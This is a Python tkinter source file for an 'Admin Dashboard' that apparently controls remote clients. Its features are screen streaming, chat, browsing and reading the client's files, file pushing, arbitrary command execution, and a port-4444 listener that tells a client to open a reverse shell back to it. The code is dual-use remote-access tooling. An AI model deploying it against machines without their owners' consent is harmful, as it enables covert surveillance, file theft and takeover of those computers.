import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import os
import io
import numpy as np
import cv2
import base64
from PIL import Image, ImageTk


from .admin_network import AdminNetwork
from .admin_stream import StreamReceiver


class AdminDashboard:
    def __init__(self, master: tk.Tk) -> None:
        self.master = master
        master.title("Admin Dashboard")
        master.geometry("1100x700")
        master.protocol("WM_DELETE_WINDOW", self.on_close)

        self.network = AdminNetwork(self)
        self.stream_receiver = None
        self.current_client: str | None = None
        self.streaming = False
        self.after_id = None

        
        self.fe_current_path: str = "HOME"
        self.fe_items: list[dict] = []

        self.notebook = ttk.Notebook(master)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        self.setup_connection_tab()
        self.setup_remote_tab()
        self.setup_chat_tab()
        self.setup_file_tab()  
        self.setup_command_tab()
        self.setup_shell_tab()

        self.update_interval = 1000
        self.update_ui()

    # ---------------- Connections ----------------
    def setup_connection_tab(self) -> None:
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Connections")

        self.client_list = ttk.Treeview(tab, columns=("ip", "status"), show="headings", height=12)
        self.client_list.heading("ip", text="Client ID")
        self.client_list.heading("status", text="Status")
        self.client_list.bind("<<TreeviewSelect>>", self.on_client_select)
        self.client_list.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        btns = ttk.Frame(tab)
        btns.pack(fill=tk.X, padx=10, pady=(0, 10))
        ttk.Button(btns, text="Disconnect", command=self.disconnect_client).pack(side=tk.LEFT)

    # ---------------- Remote Control ----------------
    def setup_remote_tab(self) -> None:
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Remote Control")

        self.stream_label = tk.Label(tab, text="Screen Stream - Waiting for connection...")
        self.stream_label.pack(pady=10)

        self.stream_canvas = tk.Canvas(tab, bg="black")
        self.stream_canvas.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        frame = ttk.Frame(tab)
        frame.pack(fill=tk.X, padx=10, pady=5)

        self.stream_btn = ttk.Button(frame, text="Start Stream", command=self.toggle_stream)
        self.stream_btn.pack(side=tk.LEFT)

    # ---------------- Chat ----------------
    def setup_chat_tab(self) -> None:
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Chat")

        self.chat_display = scrolledtext.ScrolledText(tab, state=tk.DISABLED)
        self.chat_display.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        frame = ttk.Frame(tab)
        frame.pack(fill=tk.X, padx=10, pady=5)

        self.message_entry = ttk.Entry(frame)
        self.message_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.message_entry.bind("<Return>", self.send_chat_message)

        self.send_btn = ttk.Button(frame, text="Send", command=self.send_chat_message)
        self.send_btn.pack(side=tk.LEFT)


    # ---------------- File Explorer ----------------
    def setup_file_tab(self) -> None:
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="File Explorer")

        bar = ttk.Frame(tab)
        bar.pack(fill=tk.X, padx=10, pady=(10, 5))
        ttk.Label(bar, text="Path:").pack(side=tk.LEFT)
        self.fe_path_var = tk.StringVar(value=self.fe_current_path)
        self.fe_path_entry = ttk.Entry(bar, textvariable=self.fe_path_var)
        self.fe_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=6)
        ttk.Button(bar, text="Go", command=self.fe_go).pack(side=tk.LEFT)
        ttk.Button(bar, text="Up", command=self.fe_up).pack(side=tk.LEFT, padx=4)
        ttk.Button(bar, text="Refresh", command=self.fe_refresh).pack(side=tk.LEFT)
        ttk.Button(bar, text="Send File", command=self.send_chat_file).pack(side=tk.LEFT, padx=4)

        body = ttk.Frame(tab)
        body.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        body.columnconfigure(0, weight=1)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        cols = ("name", "type", "size")
        self.fe_tree = ttk.Treeview(body, columns=cols, show="headings")
        for c, w in zip(cols, (300, 90, 120)):
            self.fe_tree.heading(c, text=c.title())
            self.fe_tree.column(c, width=w, stretch=True)
        self.fe_tree.bind("<Double-1>", self.fe_on_open)
        self.fe_tree.grid(row=0, column=0, sticky="nsew")
        yscroll = ttk.Scrollbar(body, orient=tk.VERTICAL, command=self.fe_tree.yview)
        self.fe_tree.configure(yscrollcommand=yscroll.set)
        yscroll.grid(row=0, column=0, sticky="nse")

        right = ttk.Frame(body)
        right.grid(row=0, column=1, sticky="nsew", padx=(10, 0))
        right.rowconfigure(1, weight=1)
        self.fe_preview_label = ttk.Label(right, text="Preview:")
        self.fe_preview_label.grid(row=0, column=0, sticky="w")
        self.fe_preview_area = scrolledtext.ScrolledText(right, state=tk.DISABLED, height=10)
        self.fe_preview_area.grid(row=1, column=0, sticky="nsew")
        self.fe_image_canvas = tk.Canvas(right, bg="white", height=340)
        self.fe_image_canvas.grid(row=2, column=0, sticky="nsew", pady=(10, 0))

        
        self.fe_status = ttk.Label(tab, text="Select a client then Go to list.")
        self.fe_status.pack(fill=tk.X, padx=10, pady=(0, 10))


    def fe_go(self) -> None:
        if not self.current_client:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        path = self.fe_path_var.get().strip() or "HOME"
        self.fe_request_list(path)

    def fe_up(self) -> None:
        p = self.fe_path_var.get().strip() or "HOME"
        if p in ("HOME", "ROOT"):
            self.fe_request_list("ROOT")
            return
        parent = os.path.dirname(p.rstrip("/\\")) or "ROOT"
        self.fe_path_var.set(parent)
        self.fe_request_list(parent)

    def fe_refresh(self) -> None:
        self.fe_request_list(self.fe_path_var.get().strip() or "HOME")

    def fe_on_open(self, _event=None) -> None:
        sel = self.fe_tree.selection()
        if not sel:
            return
        idx = int(self.fe_tree.item(sel[0], "values")[3])  
        item = self.fe_items[idx]
        path = item["path"]
        if item["type"] == "dir":
            self.fe_path_var.set(path)
            self.fe_request_list(path)
        else:
            self.network.request_read_file(self.current_client, path, max_bytes=1024*1024)

    def fe_request_list(self, path: str) -> None:
        self.fe_status.config(text=f"Listing: {path} …")
        self.network.request_list_dir(self.current_client, path)

    def fileexplorer_update_dir(self, client_id: str, path: str, items: list[dict], error: str | None = None) -> None:
        if client_id != self.current_client:
            return
        self.fe_tree.delete(*self.fe_tree.get_children())
        self.fe_items = items or []
        for i, it in enumerate(self.fe_items):
            size_disp = f"{it.get('size', 0):,}" if it.get("type") == "file" else ""
            self.fe_tree.insert("", tk.END, values=(it.get("name", ""), it.get("type", ""), size_disp, i))

        self.fe_tree["displaycolumns"] = ("name", "type", "size")
        self.fe_current_path = path
        self.fe_path_var.set(path)
        if error:
            self.fe_status.config(text=f"{path} – Error: {error}")
        else:
            self.fe_status.config(text=f"{path} – {len(self.fe_items)} item(s)")

    def fileexplorer_update_file(self, client_id: str, meta: dict) -> None:
        if client_id != self.current_client:
            return

        self.fe_preview_area.config(state=tk.NORMAL)
        self.fe_preview_area.delete("1.0", tk.END)
        self.fe_preview_area.config(state=tk.DISABLED)
        self.fe_image_canvas.delete("all")

        if meta.get("error"):
            self._preview_text(f"Error: {meta['error']}")
            return

        kind = meta.get("kind")  
        path = meta.get("path", "")
        self.fe_preview_label.config(text=f"Preview: {os.path.basename(path)}")
        notice = " (truncated)" if meta.get("truncated") else ""

        if kind == "text":
            self._preview_text(meta.get("text", "") + ("\n---\n[preview]" + notice if notice else ""))
        elif kind == "image":
            try:
                data = base64.b64decode(meta.get("data", ""))
                img = Image.open(io.BytesIO(data))

                cw = self.fe_image_canvas.winfo_width() or 600
                ch = self.fe_image_canvas.winfo_height() or 340
                img.thumbnail((cw, ch))
                photo = ImageTk.PhotoImage(img)
                self.fe_image_canvas.create_image(cw//2, ch//2, image=photo, anchor=tk.CENTER)
                self.fe_image_canvas.image = photo  
            except Exception as e:
                self._preview_text(f"Image decode failed: {e}")
        else:

            self._preview_text(meta.get("hexdump", "") + notice)

    def _preview_text(self, text: str) -> None:
        self.fe_preview_area.config(state=tk.NORMAL)
        self.fe_preview_area.insert(tk.END, text)
        self.fe_preview_area.config(state=tk.DISABLED)

    # ---------------- Commands ----------------
    def setup_command_tab(self) -> None:
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Commands")

        frame = ttk.Frame(tab)
        frame.pack(fill=tk.X, padx=10, pady=10)

        tk.Label(frame, text="Command:").pack(side=tk.LEFT)
        self.command_entry = ttk.Entry(frame)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.command_entry.bind("<Return>", self.execute_command)
        self.exec_btn = ttk.Button(frame, text="Execute", command=self.execute_command)
        self.exec_btn.pack(side=tk.LEFT)

        self.command_output = scrolledtext.ScrolledText(tab, state=tk.DISABLED)
        self.command_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

    # ---------------- Event handlers / helpers ----------------
    def on_client_select(self, _event=None) -> None:
        sel = self.client_list.selection()
        if sel:
            self.current_client = self.client_list.item(sel[0])["values"][0]
            self.stream_label.config(text=f"Screen Stream – Selected: {self.current_client}")

    def refresh_clients(self) -> None:
        self.client_list.delete(*self.client_list.get_children())
        for client_id, client_data in self.network.connected_clients.items():
            self.client_list.insert("", tk.END, values=(client_id, client_data.get("status", "")))

    def disconnect_client(self) -> None:
        if self.current_client:
            self.network.disconnect_client(self.current_client)

    def toggle_stream(self) -> None:
        if not self.current_client:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        client = self.network.connected_clients.get(self.current_client)
        if not client:
            return
        if client.get("streaming", False):
            self.stop_stream(client)
        else:
            self.network.send_command(self.current_client, "START_STREAM")
            client["streaming"] = True
            self.stream_btn.config(text="Stop Stream")
            if not self.stream_receiver:
                self.stream_receiver = StreamReceiver()
                self.stream_receiver.start()
            self.streaming = True
            self.after_id = self.master.after(30, self.display_next_frame)

    def stop_stream(self, client: dict) -> None:
        try:
            self.network.send_command(client["id"], "STOP_STREAM")
            client["streaming"] = False
            self.stream_btn.config(text="Start Stream")
            self.streaming = False
            if self.after_id:
                self.master.after_cancel(self.after_id)
                self.after_id = None
            if self.stream_receiver:
                self.stream_receiver.stop()
                self.stream_receiver = None
        except Exception as e:
            print(f"Stop stream error: {e}")

    def display_next_frame(self) -> None:
        if not self.stream_receiver:
            return
        frame = self.stream_receiver.get_frame()
        if frame is not None:
            try:
                
                img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
                
                cw = self.stream_canvas.winfo_width() or 800
                ch = self.stream_canvas.winfo_height() or 500
                img.thumbnail((cw, ch))
                photo = ImageTk.PhotoImage(img)
                self.stream_canvas.delete("all")
                self.stream_canvas.create_image(cw//2, ch//2, image=photo, anchor=tk.CENTER)
                self.stream_canvas.image = photo
            except Exception as e:
                print(f"Frame display error: {e}")
        if self.streaming:
            self.after_id = self.master.after(30, self.display_next_frame)

    def send_chat_message(self, _event=None) -> None:
        if not self.current_client:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        msg = self.message_entry.get().strip()
        if not msg:
            return
        self.network.send_chat(self.current_client, msg)
        self.update_chat(f"[admin] {msg}")
        self.message_entry.delete(0, tk.END)

    def send_chat_file(self) -> None:
        if not self.current_client:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        filepath = filedialog.askopenfilename()
        if not filepath:
            return
        try:
            filename = os.path.basename(filepath)
            filesize = os.path.getsize(filepath)

            progress = tk.Toplevel(self.master)
            progress.title("Sending File")
            progress.geometry("300x100")
            tk.Label(progress, text=f"Sending {filename}...").pack(pady=5)
            bar = ttk.Progressbar(progress, length=250, mode="determinate")
            bar.pack(pady=5)
            bar["maximum"] = filesize
            progress.update()

            destination = self.fe_current_path
            self.network.send_command(self.current_client, f"FILE:{filename}|{filesize}|{destination}")
            with open(filepath, "rb") as f:
                sent = 0
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    self.network.send_raw(self.current_client, chunk)
                    sent += len(chunk)
                    bar["value"] = sent
                    progress.update_idletasks()
            progress.destroy()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send file: {e}")

    def execute_command(self, _event=None) -> None:
        if not self.current_client:
            messagebox.showwarning("No Client", "Please select a client first")
            return
        cmd = self.command_entry.get().strip()
        if not cmd:
            return
        self.network.send_command(self.current_client, cmd)
        self.command_entry.delete(0, tk.END)

    def update_chat(self, message: str) -> None:
        self.chat_display.config(state=tk.NORMAL)
        self.chat_display.insert(tk.END, message + "\n")
        self.chat_display.config(state=tk.DISABLED)
        self.chat_display.see(tk.END)

    def update_command_output(self, output: str) -> None:
        self.command_output.config(state=tk.NORMAL)
        self.command_output.insert(tk.END, output + "\n")
        self.command_output.config(state=tk.DISABLED)
        self.command_output.see(tk.END)

    def update_ui(self) -> None:
        self.refresh_clients()
        self.master.after(self.update_interval, self.update_ui)

    def on_close(self) -> None:
        self.network.stop_server()
        if self.after_id:
            self.master.after_cancel(self.after_id)
        self.master.destroy()



    # ---------------- Shell ----------------
    def setup_shell_tab(self) -> None:
        import socket, select

        self.shell_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.shell_tab, text="Shell")

        # Top controls
        ctrl = ttk.Frame(self.shell_tab)
        ctrl.pack(fill=tk.X, padx=10, pady=8)

        ttk.Label(ctrl, text="Bind IP:").pack(side=tk.LEFT)
        self.shell_bind_ip = tk.StringVar(value="0.0.0.0")
        ttk.Entry(ctrl, textvariable=self.shell_bind_ip, width=14).pack(side=tk.LEFT, padx=6)

        ttk.Label(ctrl, text="Port:").pack(side=tk.LEFT)
        self.shell_port = tk.IntVar(value=4444)
        ttk.Entry(ctrl, textvariable=self.shell_port, width=7).pack(side=tk.LEFT, padx=6)

        self.shell_status = tk.StringVar(value="Listener stopped")
        ttk.Label(ctrl, textvariable=self.shell_status).pack(side=tk.LEFT, padx=10)

        self.btn_shell_start = ttk.Button(ctrl, text="Start Listener", command=self.start_shell_listener)
        self.btn_shell_start.pack(side=tk.RIGHT, padx=6)
        self.btn_shell_stop = ttk.Button(ctrl, text="Stop", command=self.stop_shell_listener, state=tk.DISABLED)
        self.btn_shell_stop.pack(side=tk.RIGHT, padx=6)
        self.btn_shell_client = ttk.Button(ctrl, text="Start on Client", command=self.start_shell_on_client)
        self.btn_shell_client.pack(side=tk.RIGHT, padx=6)

        # Copy helper for client command
        helper = ttk.Frame(self.shell_tab)
        helper.pack(fill=tk.X, padx=10)
        self.shell_helper_cmd = tk.StringVar(value="python client/shell_client.py")
        ttk.Entry(helper, textvariable=self.shell_helper_cmd, state="readonly").pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(helper, text="Copy client command", command=lambda: self.copy_to_clipboard(self.shell_helper_cmd.get())).pack(side=tk.LEFT, padx=6)

        # Output area
        self.shell_output = scrolledtext.ScrolledText(self.shell_tab, height=18, state="disabled")
        self.shell_output.pack(fill=tk.BOTH, expand=True, padx=10, pady=8)

        # Command input
        cmd_frame = ttk.Frame(self.shell_tab)
        cmd_frame.pack(fill=tk.X, padx=10, pady=6)
        self.shell_cmd = tk.StringVar()
        entry = ttk.Entry(cmd_frame, textvariable=self.shell_cmd)
        entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        entry.bind("<Return>", lambda e: self.send_shell_command())
        ttk.Button(cmd_frame, text="Send", command=self.send_shell_command).pack(side=tk.LEFT, padx=6)
        ttk.Button(cmd_frame, text="Clear", command=lambda: self._shell_log_clear()).pack(side=tk.LEFT)

        # internals
        self._shell_srv_sock = None
        self._shell_client = None
        self._shell_reader_thread = None
        self._shell_running = False


    def start_shell_on_client(self) -> None:
        # Determine IP for client to connect to
        bind_ip = self.shell_bind_ip.get().strip() or "0.0.0.0"
        port = int(self.shell_port.get() or 4444)
        target_ip = bind_ip
        if bind_ip in ("0.0.0.0", "127.0.0.1", ""):
            # Try to resolve a LAN IP
            try:
                import socket
                hostname = socket.gethostname()
                target_ip = socket.gethostbyname(hostname)
                if target_ip.startswith("127."):
                    target_ip = "127.0.0.1"
            except Exception:
                target_ip = "127.0.0.1"
        if getattr(self, "current_client", None):
            try:
                self.network.send_command(self.current_client, f"SHELL_START {target_ip} {port}")
                self._shell_log(f"[>] Requested client to start shell to {target_ip}:{port}\n")
            except Exception as e:
                self._shell_log(f"[-] Could not send start to client: {e}\n")
        else:
            self._shell_log("[-] No client selected in Connections tab.\n")

    def copy_to_clipboard(self, text: str) -> None:
        try:
            self.master.clipboard_clear()
            self.master.clipboard_append(text)
            self.master.update()
        except Exception:
            pass

    def _shell_log(self, text: str) -> None:
        self.shell_output.configure(state="normal")
        self.shell_output.insert(tk.END, text)
        self.shell_output.see(tk.END)
        self.shell_output.configure(state="disabled")

    def _shell_log_clear(self) -> None:
        self.shell_output.configure(state="normal")
        self.shell_output.delete("1.0", tk.END)
        self.shell_output.configure(state="disabled")

    def start_shell_listener(self) -> None:
        import socket, threading
        if self._shell_running:
            return
        bind_ip = self.shell_bind_ip.get().strip() or "0.0.0.0"
        port = int(self.shell_port.get())
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((bind_ip, port))
            srv.listen(1)
            self._shell_srv_sock = srv
            self._shell_running = True
            self.btn_shell_start.configure(state=tk.DISABLED)
            self.btn_shell_stop.configure(state=tk.NORMAL)
            self.shell_status.set(f"Listening on {bind_ip}:{port} ...")
            self._shell_log(f"[+] Listening on {bind_ip}:{port}\n")
            threading.Thread(target=self._shell_accept_loop, daemon=True).start()
        except Exception as e:
            messagebox.showerror("Shell", f"Failed to start listener: {e}")

    def _shell_accept_loop(self) -> None:
        import socket
        try:
            client, addr = self._shell_srv_sock.accept()
            self._shell_client = client
            self.shell_status.set(f"Connected: {addr[0]}:{addr[1]}")
            self._shell_log(f"[+] Client connected from {addr[0]}:{addr[1]}\n")
            # Start reader thread
            t = threading.Thread(target=self._shell_reader, daemon=True)
            t.start()
            self._shell_reader_thread = t
        except Exception as e:
            self._shell_log(f"[-] Accept error: {e}\n")

    def _shell_reader(self) -> None:
        import select
        sock = self._shell_client
        try:
            while self._shell_running and sock:
                r, _, _ = select.select([sock], [], [], 0.2)
                if sock in r:
                    data = sock.recv(4096)
                    if not data:
                        break
                    try:
                        text = data.decode(errors="ignore")
                    except Exception:
                        text = str(data)
                    self._shell_log(text)
        except Exception as e:
            self._shell_log(f"[-] Reader error: {e}\n")
        finally:
            self._shell_client = None
            self.shell_status.set("Disconnected")
            self.btn_shell_start.configure(state=tk.NORMAL)
            self.btn_shell_stop.configure(state=tk.DISABLED)

    def send_shell_command(self) -> None:
        cmd = (self.shell_cmd.get() or "").strip()
        if not cmd:
            return
        self.shell_cmd.set("")
        sock = self._shell_client
        if not sock:
            self._shell_log("[-] No client connected.\n")
            return
        try:
            sock.sendall((cmd + "\n").encode())
        except Exception as e:
            self._shell_log(f"[-] Send error: {e}\n")

    def stop_shell_listener(self) -> None:
        import socket
        self._shell_running = False
        try:
            if self._shell_client:
                try:
                    self._shell_client.shutdown(2)
                except Exception:
                    pass
                self._shell_client.close()
        except Exception:
            pass
        try:
            if self._shell_srv_sock:
                try:
                    self._shell_srv_sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                self._shell_srv_sock.close()
        except Exception:
            pass
        self._shell_srv_sock = None
        self._shell_client = None
        self.shell_status.set("Listener stopped")
        self.btn_shell_start.configure(state=tk.NORMAL)
        self.btn_shell_stop.configure(state=tk.DISABLED)

